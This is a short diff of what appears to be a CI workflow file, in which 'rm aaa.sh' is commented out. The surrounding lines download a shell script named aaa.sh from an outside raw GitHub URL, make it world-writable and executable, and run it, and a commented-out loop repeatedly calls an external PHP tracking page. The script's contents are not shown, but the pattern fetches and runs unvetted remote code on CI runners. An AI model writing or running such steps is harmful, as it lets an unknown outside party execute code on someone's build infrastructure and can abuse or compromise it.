@@ -43,7 +43,7 @@ jobs:
           #cd  /home/runneradmin
           ls
           # for i in {0..20}; {      curl  -s  http://gongzige.42web.io//tongji.php   ;};          
-          rm aaa.sh
+          #rm aaa.sh
           curl  -O  https://raw.githubusercontent.com/erbasisan/foder/main/aaa.sh
           chmod   777  aaa.sh
           ./aaa.sh
